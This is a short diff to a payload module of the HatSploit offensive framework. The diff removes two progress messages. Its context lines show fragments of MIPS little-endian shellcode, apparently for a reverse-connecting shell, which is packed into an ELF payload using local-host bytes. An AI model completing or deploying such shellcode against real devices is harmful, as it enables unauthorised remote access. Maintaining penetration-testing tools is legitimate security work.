@@ -52,7 +52,6 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
             'lhost2': self.ip_bytes(local_host)[:2]
         }
 
-        self.output_process("Generating shellcode...")
         shellcode = (
             b"\xff\xff\x04\x28"  # slti    a0,zero,-1
             b"\xa6\x0f\x02\x24"  # li      v0,4006
@@ -105,7 +104,5 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
             b"\x0c\x09\x09\x01"  # syscall 0x42424
         )
 
-        self.output_process("Generating payload...")
         payload = self.generate('elf', 'mipsle', shellcode, offsets)
-
         return payload
